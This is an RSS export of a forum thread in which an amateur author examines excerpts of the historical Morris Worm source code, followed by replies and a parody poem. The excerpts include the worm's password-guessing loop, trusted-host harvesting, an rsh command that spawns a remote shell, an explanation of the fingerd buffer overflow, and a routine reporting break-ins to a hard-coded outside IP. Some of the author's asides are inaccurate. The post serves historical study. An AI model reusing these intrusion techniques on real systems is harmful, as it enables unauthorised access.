<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
    <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685</link>
    <description>**Introduction to The Post**

Hey guys! Considering this is the first actual post besides the introduction, I thought it would be best to start big and start with a *bang* you could say. Besides that I think the Morris Worm would very much deserve a spot in the start of this series considering it was one of the first worms that actually caused some level of damage on a *large* scale. So lets get right into it. Oi and sorry for the late post. It&#39;s really hard to keep up with everything, but I&#39;ll try!
***
**What is the Morris Worm?**

The Morris Worm was a worm created by Cornell graduate student Robert Morris Jr. The Worm itself was initially created by Morris as an experiment in order to measure the size of the ARPANET (an early predecessor of the Internet). However a critical error in the code (we&#39;ll talk about it below later), caused it to begin replicating itself on the same computer multiple times slowing down these already weak computers (computers at that time had a very-very small amount of storage and small amount of RAM as well) to the point of being unusable. Or in other words, the Morris Worm &quot;accidentally&quot; performed a DoS (Denial of Service) attack.
***
**Alright...How did it spread though?**
Although, the worm itself may seem of good intention (as I said above it was originally created in order to gauge the overall size of the ARPANET at the time), it still used exploits in order to spread. Such exploits were vulnerabilities in UNIX sendmail, (fun fact: Linux was originally based off of Unix- Linux&#39;s creator decided to make Linux after the UNIX development team refused his suggestions, and he sought to make something that the entire community could have a positive effect on and work on) rsh/rexec (rsh is a remote shell, and rexec is a remote exec - if you&#39;re curious you can find more at http://www.denicomp.com/readmore.htm), as well as guessing weak passwords (sorry to interrupt again, but if you&#39;re also curious I&#39;ve included a link of common passwords for computers at that time right here: http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time - the list was created in 2008, but many of the passwords it includes are in this list many of them being sexually based passwords) 
***
**Tell us a bit more about it&#39;s Creator Robert Morris please!**
Alright! Well as I said above it&#39;s creator was Robert Morris a grad student from Cornell university. When he decided to let the worm into the wild, he actually did it from MIT in order to mask where it came from. Due to the large amount of damage caused by the worm, Morris would eventually become one of the first people charged under the Computer Fraud and Abuse Act. He currently has tenure at MIT. 
***
**Can we get keyboard dirty now?**
Why yes we can! (In case any of you didn&#39;t know being keyboard dirty is just slang for &quot;show us code&quot; or &quot;use code&quot;). Just before I start using code, I just wanted to share with you guys the link I used to look at it. Big props to these guys: http://www.foo.be/docs-free/morris-worm/worm/ (I also know that some of you are big users of github, so here&#39;s a link to the source code in github just for you guys: https://github.com/arialdomartini/morris-worm ) for being able to have the Morris Worm source code in text format for all of us who want to study it in the future :smiley:! Oh and one more thing, you can go into the &quot;parent directory&quot; and view other files and so on that it has, but I&#39;d suggest also once the article&#39;s finished going into the &quot;parent directory&quot; which houses original reports on the worm itself and even a cool poem about it (which I will include later on). Let&#39;s get started, eh! (Oh, and the worm was written in C, or current versions of it are- mind you the explanation of what it does and so on won&#39;t really be *that* in depth) 
***
**The Password Cracker**
This component of the worm was created in order to as I said above &quot;guessed weak passwords&quot;, you can find the original list of the passwords the worm guessed in here as well so here&#39;s the link: http://www.foo.be/docs-free/morris-worm/worm/cracksome.c.txt .  But just for the sake of your time, I&#39;ll include components of the code in here and explain their functions!:




    
    FILE *hosteq;
    char scanbuf[512];
    char fwd_buf[256];
    char *fwd_host;
    char getbuf[256];
    struct passwd *pwent;
    char local[20];
    struct usr *user;
    struct hst *host;				/* 1048 */
    int check_other_cnt;			/* 1052 */
    static struct usr *user_list = NULL;
    hosteq = fopen(XS(&quot;/etc/hosts.equiv&quot;), XS(&quot;r&quot;));
    if (hosteq != NULL) {			/* 292 */
	while (fscanf(hosteq, XS(&quot;%.100s&quot;), scanbuf)) {
	    host = h_name2host(scanbuf, 0);
	    if (host == 0) {
		host = h_name2host(scanbuf, 1);
		getaddrs(host);
	    }
	    if (host-&gt;o48[0] == 0)		/* 158 */
		continue;
	    host-&gt;flag |= 8;
	}
	fclose(hosteq);				/* 280 */
    }

    hosteq = fopen(XS(&quot;/.rhosts&quot;), XS(&quot;r&quot;));
    if (hosteq != NULL) {			/* 516 */
	while (fgets(getbuf, sizeof(getbuf), hosteq)) { /* 344,504 */
	    if (sscanf(getbuf, XS(&quot;%s&quot;), scanbuf) != 1)
		continue;
	    host = h_name2host(scanbuf, 0);
	    while (host == 0) {			/* 436, 474 */
		host = h_name2host(scanbuf, 1);
		getaddrs(host);
	    }
	    if (host-&gt;o48[0] == 0)
		continue;
	    host-&gt;flag |= 8;
	}
	fclose(hosteq);
    }


Alright, so in short what this lovely piece of code is doing is searching for the /etc/hosts.equiv, and /.rhost for a new host. In case you didn&#39;t know what both of them are, an /etc/hosts.equiv contains a list of a trusted host(s) for a remote system. A  /.rhost is a mechanism that allows a system to trust another system. In fact here&#39;s one of Morris&#39;s notes before the code:

    /* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */

Here&#39;s another function which doesn&#39;t allow a foreign or complicated host.-:

    if (strlen(host-&gt;hostname) &gt; 11)
	    continue;
	user = (struct usr *)malloc(sizeof(struct usr));
	strcpy(user-&gt;name, pwent-&gt;pw_name);
	strcpy(&amp;user-&gt;passwd[0], XS(&quot;x&quot;));
	user-&gt;decoded_passwd[0] = &#39;\0&#39;;
	user-&gt;homedir = strcpy(malloc(strlen(pwent-&gt;pw_dir)+1), pwent-&gt;pw_dir);
	user-&gt;gecos = strcpy(malloc(strlen(pwent-&gt;pw_gecos)+1), pwent-&gt;pw_gecos
    );
	user-&gt;next = user_list;
	user_list = user;
    }
    endpwent();
    cmode = 1;
    x27f2c = user_list;
    return;
    } 

This, function was supposed to be (I assume) to keep the worm from spreading to anything government or anything that would be located outside of the ARPANET (if it could spread outside of it...wait can it- I think I just found something else to occupy my time instead of bingo night with grandma).

Now here&#39;s another piece of code, that trys potential passwords (you can find the list above it)

    {
    struct usr *user;
    int i, j;

    if (wds[nextw] == 0) {
	cmode++;
	return;					/* 2724 */
    }
    if (nextw == 0) {				/* 2550 */
	for (i = 0; wds[i]; i++)
	    ;
	permute(wds, i, sizeof(wds[0]));
    }

    for (j = 0; wds[nextw][j] != &#39;\0&#39;; j++)
	wds[nextw][j] &amp;= 0x7f;
    for (user = x27f28; user; user = user-&gt;next)
	try_passwd(user, wds[nextw]);
    for (j = 0; wds[nextw][j]; j++)		/* 2664,2718 */
	wds[nextw][j] |= 0x80;
    nextw += 1;
    return;
    }

And that&#39;s it for the password cracker! Whoo, this is long. If you&#39;d like to I&#39;d suggest a quick rest. Just so you know I&#39;m not showing everything for your sake, and mines-  which is why I gave y&#39;all the link leading to all of the code so you can look at it if you&#39;d like. Also please note, I&#39;m not exactly experienced with C (I&#39;m new) so please tell me if I say anything incorrect in the comments, and I&#39;ll correct it.
***
**Hs.c.txt**
I&#39;ll have to apologize as I can&#39;t examine this part of the worm (It&#39;s long as hell), however going back a bit on what I just recently said Morris did include this piece of code in this part that really caught my eye:

    /* I call this &quot;huristic 1&quot;. It tries to breakin using the remote execution
    * service.  It is called from a subroutine of cracksome_1 with information fr
    om
     * a user&#39;s .forword file.  The two name are the original username and the one
    * in the .forward file.
    */
     hu1(alt_username, host, username2)		/* x5178 */
     char *alt_username, *username2;
     struct hst *host;
    {
    char username[256];
    char buffer2[512];
    char local[8];
    int result, i, fd_for_sh;			/* 780, 784, 788 */
    
    if (host == me)
	return 0;				/* 530 */
    if (host-&gt;flag &amp; HST_HOSTTWO)			/* Already tried ??? */
	return 0;
    
    if (host-&gt;o48[0] || host-&gt;hostname == NULL)
	getaddrs(host);
    if (host-&gt;o48[0] == 0) {
	host-&gt;flag |= HST_HOSTFOUR;
	return 0;
    }
    strncpy(username, username2, sizeof(username)-1);
    username[sizeof(username)-1] = &#39;\0&#39;;
    
    if (username[0] == &#39;\0&#39;)
	strcpy(username, alt_username);
    
    for (i = 0; username[i]; i++)
	if (ispunct(username[i]) || username[i] &lt; &#39; &#39;)
	    return 0;
    other_sleep(1);
    
    fd_for_sh = x538e(host, username, &amp;alt_username[30]);
    if (fd_for_sh &gt;= 0) {
	result = talk_to_sh(host, fd_for_sh, fd_for_sh);
	close(fd_for_sh);
	return result;
    }
    if (fd_for_sh == -2)
	return 0;
    
    fd_for_sh = x538e(me, alt_username, &amp;alt_username[30]);
    if (fd_for_sh &gt;= 0) {
	sprintf(buffer2, XS(&quot;exec /usr/ucb/rsh %s -l %s \&#39;exec /bin/sh\&#39;\n&quot;),
		host-&gt;hostname, username);
	send_text(fd_for_sh, buffer2);
	sleep(10);
	result = 0;
	if (test_connection(fd_for_sh, fd_for_sh, 25))	/* 508 */
	    result = talk_to_sh(host, fd_for_sh, fd_for_sh);
	close(fd_for_sh);
	return result;
    }
    return 0;
    }
This at a short glance you can easily find out (from Morris&#39;s notes) that this is an attempt at breaking in using a remote execution service, and gets information from the user&#39;s .forword file. 

You can also find some really interesting code above it. Morris describes one part of his code in detail as : 

/* 
From Gene Spafford &lt;spaf@perdue.edu&gt;
What this routine does is actually kind of clever.  Keep in
mind that on a Vax the stack grows downwards.

fingerd gets its input via a call to gets, with an argument
of an automatic variable on the stack.  Since gets doesn&#39;t
have a bound on its input, it is possible to overflow the
buffer without an error message.  Normally, when that happens
you trash the return stack frame.  However, if you know
where everything is on the stack (as is the case with a
distributed binary like BSD), you can put selected values
back in the return stack frame.

This is what that routine does.  It overwrites the return frame
to point into the buffer that just got trashed.  The new code
does a chmk (change-mode-to-kernel) with the service call for
execl and an argument of &quot;/bin/sh&quot;.  Thus, fingerd gets a
service request, forks a child process, tries to get a user name
and has its buffer trashed, does a return, exec&#39;s a shell,
and then proceeds to take input off the socket -- from the
worm on the other machine.  Since many sites never bother to
fix fingerd to run as something other than root.....

Luckily, the code doesn&#39;t work on Suns -- it just causes it
to dump core.

--spaf

*/    

/* This routine exploits a fixed 512 byte input buffer in a VAX running
 * the BSD 4.3 fingerd binary.  It send 536 bytes (plus a newline) to
 * overwrite six extra words in the stack frame, including the return
 * PC, to point into the middle of the string sent over.  The instructions
 * in the string do the direct system call version of execve(&quot;/bin/sh&quot;). */


You can find it&#39;s code right above the code I had included above.

***
**Net.c.txt**
(Please note I skipped one part of the code before this, as 1- I have a lot more to write, and 2- I wanted to cover most of the things I thought of as important in order to save time)

So here&#39;s most of the code found in this file:

     if_init()			/* 0x254c, check again */
     {
    struct ifconf if_conf;
    struct ifreq if_buffer[12];
    int  s, i, num_ifs, j;
    char local[48];
    
    nifs = 0;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s &lt; 0)
	return 0;				/* if_init+1042 */
    if_conf.ifc_req = if_buffer;
    if_conf.ifc_len = sizeof(if_buffer);
    
    if (ioctl(s, SIOCGIFCONF, &amp;if_conf) &lt; 0) {
	close(s);
	return 0;				/* if_init+1042 */
    }
    
    num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
    for(i = 0; i &lt; num_ifs; i++) {		/* if_init+144 */
	for (j = 0; j &lt; nifs; j++)
	    /* Oops, look again.  This line needs verified. */
	    if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
		break;
    }
    
    }	

     /* Yes all of these are in the include file, but why bother?  Everyone knows
      netmasks, and they will never change... */
    def_netmask(net_addr)				/* 0x2962 */
     int net_addr;
    {
    if ((net_addr &amp; 0x80000000) == 0)
	return 0xFF000000;
    if ((net_addr &amp; 0xC0000000) == 0xC0000000)
	return 0xFFFF0000;
    return 0xFFFFFF00;
     }
 
    netmaskfor(addr)				/* 0x29aa */
      int addr;
    {
    int i, mask;
    
    mask = def_netmask(addr);
    for (i = 0; i &lt; nifs; i++)
	if ((addr &amp; mask) == (ifs[i].if_l16 &amp; mask))
	    return ifs[i].if_l24;
    return mask;
    }

    rt_init()					/* 0x2a26 */
    {
    FILE *pipe;
    char input_buf[64];
    int	 l204, l304;
    
    ngateways = 0;
    pipe = popen(XS(&quot;/usr/ucb/netstat -r -n&quot;), XS(&quot;r&quot;));
   						 /* &amp;env102,&amp;env 125 */
    if (pipe == 0)
	return 0;
    while (fgets(input_buf, sizeof(input_buf), pipe)) { /* to 518 */
	other_sleep(0);
	if (ngateways &gt;= 500)
	    break;
	sscanf(input_buf, XS(&quot;%s%s&quot;), l204, l304);	/* &lt;env+127&gt;&quot;%s%s&quot; */
	/* other stuff, I&#39;ll come back to this later */
	
	
       }						/* 518, back to 76 */
      pclose(pipe);
      rt_init_plus_544();
      return 1;
     }						/* 540 */

    static rt_init_plus_544()				/* 0x2c44 */
    {
    }

    getaddrs()					/* 0x2e1a */
    {
    }

    struct bar *a2in(a)		/* 0x2f4a, needs to be fixed */
     int a;
    {
    static struct bar local;
    local.baz = a;
    return &amp;local;
    }

Basically this code is one of the second of the 5 source code files making up the .o file. which was distributed along with the worm as it spread.
***
**Some other Code...**
I really don&#39;t want to bother any of you guys (and myself) with this much writing (I&#39;m not used to this much writing, and I&#39;m honestly quite sure you may get a bit tired from reading it, so I&#39;ll just include just one more piece of code, and explain their functions. You can find all these codes in the link I gave y&#39;all.

   -


    static report_breakin(arg1, arg2)		/* 0x2494 */
    {
    int s;
    struct sockaddr_in sin;
    char msg;
    
    if (7 != random() % 15)
	return;
    
    bzero(&amp;sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = REPORT_PORT;
    sin.sin_addr.s_addr = inet_addr(XS(&quot;128.32.137.13&quot;));
						/* &lt;env+77&gt;&quot;128.32.137.13&quot; */
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s &lt; 0)
	return;
    if (sendto(s, &amp;msg, 1, 0, &amp;sin, sizeof(sin)))
	;
    close(s);
    }

So what this code does is it reports if a break in has been successfully by sending one byte to the address &quot;128.32.137.13&quot;.

***
**Conclusion**
Well here we are! Well it&#39;s really been an honor to be able to look at a worm as good as the Morris Worm, and be able to show it to you guys! In short however, although you can&#39;t use the Morris Worm today it will give you tons of insight about how computers worked back then, and so on.
***

**Sources**
What&#39;s a good article without sources to back it up? Use these for your own curiosity!
I got all my info from the following links: 
- https://en.wikipedia.org/wiki/Morris_worm

http://limn.it/the-morris-worm/

http://www.zdnet.com/article/the-morris-worm-internet-malware-turns-25/

http://www.cs.unc.edu/~jeffay/courses/nidsS05/attacks/seely-RTMworm-89.html#p2

http://www.cybertelecom.org/security/morris.htm

Anything else were original reports done on the Worm that can be found in the &quot;parent directory&quot; I was talking about.
***
**A Quick Poem About the Morris Worm:**

			&quot;The Worm Before Christmas&quot;
			    by Clement C. Morris

	    (a.k.a. David Bradley, Betty Cheng, Hal Render, 
			Greg Rogers, and Dan LaLiberte)

	Twas the night before finals, and all through the lab
	Not a student was sleeping, not even McNabb.
	Their projects were finished, completed with care
	In hopes that the grades would be easy (and fair).

	The students were wired with caffeine in their veins
	While visions of quals nearly drove them insane.
        With piles of books and a brand new highlighter,
	I had just settled down for another all nighter ---

	When out from our gateways arose such a clatter,
	I sprang from my desk to see what was the matter;
	Away to the console I flew like a flash,
        And logged in as root to fend off a crash.

	The windows displayed on my brand new Sun-3,
	Gave oodles of info --- some in 3-D.
	When, what to my burning red eyes should appear
	But dozens of &quot;nobody&quot; jobs.  Oh dear!

	With a blitzkrieg invasion, so virulent and firm,
        I knew in a moment, it was Morris&#39;s Worm!
	More rapid than eagles his processes came,
	And they forked and exec&#39;ed and they copied by name:

	&quot;Now Dasher!  Now Dancer!  Now, Prancer and Vixen!
	On Comet!  On Cupid!  On Donner and Blitzen!
	To the sites in .rhosts and host.equiv
	Now, dash away!  dash away!  dash away all!&quot;

	
	And then in a twinkling, I heard on the phone,
	The complaints of the users.  (Thought I was alone!)
	&quot;The load is too high!&quot;  &quot;I can&#39;t read my files!&quot;
	&quot;I can&#39;t send my mail over miles and miles!&quot;

	I unplugged the net, and was turning around,
        When the worm-ridden system went down with a bound.
	I fretted.  I frittered.  I sweated.  I wept.
	Then finally I core dumped the worm in /tmp.

	It was smart and pervasive, a right jolly old stealth,
	And I laughed, when I saw it, in spite of myself.
	A look at the dump of that invasive thread
	Soon gave me to know we had nothing to dread.

	The next day was slow with no network connections,
	For we wanted no more of those pesky infections.
	But in spite of the news and the noise and the clatter,
	Soon all became normal, as if naught were the matter.

	Then later that month while all were away,
	A virus came calling and then went away.
	The system then told us, when we logged in one night:
        &quot;Happy Christmas to all!  (You guys aren&#39;t so bright.)&quot;


	[ Note:  The machines dasher.cs.uiuc.edu, 
	  dancer.cs.uiuc.ed, prancer.cs.uiuc.edu, etc. have
	  been renamed deer1, deer2, deer3, etc. so as not
	  to confuse the already burdened students who use 
	  those machines. We regret that this poem reflects 
	  the older naming scheme and hope it does not confuse
	  the network adminstrator at your site.  -Ed.]

***

**My Challenge to You Guys!**
Alright, so in other posts I&#39;ve seen other community members where they&#39;ve included code, and other members have re-wrote the code in another language. So my challenge for you guys is to do just that!
***
Oh and on a side not the &quot;0x02&quot; in the title is my way of saying &quot;0.02&quot; or &quot;the second out of however many posts in this series just to clear things up.
***</description>
    
    <lastBuildDate>Sun, 05 Feb 2017 14:28:35 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/11">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/11</link>
        <pubDate>Sun, 21 Jan 2018 00:42:06 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-11</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[khusnul_newlife]]></dc:creator>
        <description><![CDATA[
            <p>such a good article bro!</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/10">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/10</link>
        <pubDate>Sun, 05 Feb 2017 14:28:35 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-10</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Indeed ignorant of me to do so. Duly noted.</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/9">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/9</link>
        <pubDate>Mon, 04 Jul 2016 08:12:21 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-9</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>What <a class="mention" href="https://d.clarkee.co.uk/u/oaktree">@oaktree</a> said, and use the correct syntax highlighting module. There’s an article about how to use it. Also fix the indentation, the code is hard to read.</p>
<p><a href="https://0x00sec.org/t/how-to-format-your-code/181?u=pry0cc" class="onebox" target="_blank" rel="noopener">https://0x00sec.org/t/how-to-format-your-code/181?u=pry0cc</a></p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/8">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/8</link>
        <pubDate>Mon, 04 Jul 2016 07:38:43 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-8</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>I second <a class="mention" href="https://d.clarkee.co.uk/u/oaktree">@oaktree</a>’s proposal.</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/7">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/7</link>
        <pubDate>Mon, 04 Jul 2016 00:11:11 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-7</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Maybe try to contextualize the code snippets a bit more, rather than relying solely on comments?</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/6</link>
        <pubDate>Mon, 04 Jul 2016 00:09:54 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-6</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Thanks, anything that I could improve for later articles?</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/5</link>
        <pubDate>Sun, 03 Jul 2016 23:17:50 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-5</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Good article! Was a good overview of it, and I’m a fan of the naming convention for versions on this baby <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/4</link>
        <pubDate>Sun, 03 Jul 2016 21:22:38 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-4</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Ah thanks! Means a lot coming from you.</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/3</link>
        <pubDate>Sat, 02 Jul 2016 17:31:32 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-3</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there.</p>
<p>I will also recommend to take a look to the <code>main</code> (worm.c) function. It makes use of some tricks to hide the process and delete temporally files. Also check <code>hs.c</code> and see how it compiles the exploits… it was a kind of multi-platform malware.</p>
<p><a class="mention" href="https://d.clarkee.co.uk/u/cromical">@Cromical</a>. good choice to kick off the series</p>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/2</link>
        <pubDate>Sat, 02 Jul 2016 10:44:02 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-2</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
      <item>
        <title>Examining the Morris Worm Source Code - Malware Series - 0x02</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p><strong>Introduction to The Post</strong></p>
<p>Hey guys! Considering this is the first actual post besides the introduction, I thought it would be best to start big and start with a <em>bang</em> you could say. Besides that I think the Morris Worm would very much deserve a spot in the start of this series considering it was one of the first worms that actually caused some level of damage on a <em>large</em> scale. So lets get right into it. Oi and sorry for the late post. It’s really hard to keep up with everything, but I’ll try!</p>
<hr>
<p><strong>What is the Morris Worm?</strong></p>
<p>The Morris Worm was a worm created by Cornell graduate student Robert Morris Jr. The Worm itself was initially created by Morris as an experiment in order to measure the size of the ARPANET (an early predecessor of the Internet). However a critical error in the code (we’ll talk about it below later), caused it to begin replicating itself on the same computer multiple times slowing down these already weak computers (computers at that time had a very-very small amount of storage and small amount of RAM as well) to the point of being unusable. Or in other words, the Morris Worm “accidentally” performed a DoS (Denial of Service) attack.</p>
<hr>
<p><strong>Alright…How did it spread though?</strong><br>
Although, the worm itself may seem of good intention (as I said above it was originally created in order to gauge the overall size of the ARPANET at the time), it still used exploits in order to spread. Such exploits were vulnerabilities in UNIX sendmail, (fun fact: Linux was originally based off of Unix- Linux’s creator decided to make Linux after the UNIX development team refused his suggestions, and he sought to make something that the entire community could have a positive effect on and work on) rsh/rexec (rsh is a remote shell, and rexec is a remote exec - if you’re curious you can find more at <a href="http://www.denicomp.com/readmore.htm" rel="noopener nofollow ugc">http://www.denicomp.com/readmore.htm</a>), as well as guessing weak passwords (sorry to interrupt again, but if you’re also curious I’ve included a link of common passwords for computers at that time right here: <a href="http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time" rel="noopener nofollow ugc">http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time</a> - the list was created in 2008, but many of the passwords it includes are in this list many of them being sexually based passwords)</p>
<hr>
<p><strong>Tell us a bit more about it’s Creator Robert Morris please!</strong><br>
Alright! Well as I said above it’s creator was Robert Morris a grad student from Cornell university. When he decided to let the worm into the wild, he actually did it from MIT in order to mask where it came from. Due to the large amount of damage caused by the worm, Morris would eventually become one of the first people charged under the Computer Fraud and Abuse Act. He currently has tenure at MIT.</p>
<hr>
<p><strong>Can we get keyboard dirty now?</strong><br>
Why yes we can! (In case any of you didn’t know being keyboard dirty is just slang for “show us code” or “use code”). Just before I start using code, I just wanted to share with you guys the link I used to look at it. Big props to these guys: <a href="http://www.foo.be/docs-free/morris-worm/worm/" rel="noopener nofollow ugc">http://www.foo.be/docs-free/morris-worm/worm/</a> (I also know that some of you are big users of github, so here’s a link to the source code in github just for you guys: <a href="https://github.com/arialdomartini/morris-worm" rel="noopener nofollow ugc">https://github.com/arialdomartini/morris-worm</a> ) for being able to have the Morris Worm source code in text format for all of us who want to study it in the future <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">! Oh and one more thing, you can go into the “parent directory” and view other files and so on that it has, but I’d suggest also once the article’s finished going into the “parent directory” which houses original reports on the worm itself and even a cool poem about it (which I will include later on). Let’s get started, eh! (Oh, and the worm was written in C, or current versions of it are- mind you the explanation of what it does and so on won’t really be <em>that</em> in depth)</p>
<hr>
<p><strong>The Password Cracker</strong><br>
This component of the worm was created in order to as I said above “guessed weak passwords”, you can find the original list of the passwords the worm guessed in here as well so here’s the link: <a href="http://www.foo.be/docs-free/morris-worm/worm/cracksome.c.txt" rel="noopener nofollow ugc">http://www.foo.be/docs-free/morris-worm/worm/cracksome.c.txt</a> .  But just for the sake of your time, I’ll include components of the code in here and explain their functions!:</p>
<pre><code>FILE *hosteq;
char scanbuf[512];
char fwd_buf[256];
char *fwd_host;
char getbuf[256];
struct passwd *pwent;
char local[20];
struct usr *user;
struct hst *host;				/* 1048 */
int check_other_cnt;			/* 1052 */
static struct usr *user_list = NULL;
hosteq = fopen(XS("/etc/hosts.equiv"), XS("r"));
if (hosteq != NULL) {			/* 292 */
while (fscanf(hosteq, XS("%.100s"), scanbuf)) {
    host = h_name2host(scanbuf, 0);
    if (host == 0) {
	host = h_name2host(scanbuf, 1);
	getaddrs(host);
    }
